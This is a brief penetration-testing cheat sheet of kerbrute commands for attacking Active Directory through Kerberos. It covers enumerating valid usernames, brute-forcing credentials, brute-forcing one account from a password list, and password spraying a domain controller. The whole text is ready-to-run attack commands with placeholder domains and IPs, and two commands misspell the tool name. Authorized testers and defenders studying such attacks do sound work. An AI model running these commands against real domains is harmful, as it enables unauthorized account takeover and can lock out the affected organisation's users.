Enumerate valid Usernames
```
./kerberute userenum --dc dc.domain.local -d domain.local WORDLIST_HERE
```

Bruteforce Creds
```
./kerberute bruteforce --dc dc.domain.local -d domain.local WORDLIST_HERE
```

Bruteforce one Username with a password list
```
./kerbrute bruteuser --dc 192.168.1.19 -d domain.local pass.txt aarti
```

password spray 
```
./kerbrute passwordspray --dc 192.168.1.19 -d domain.local users.txt Password@1
```

Saving output
```
-o output.txt
```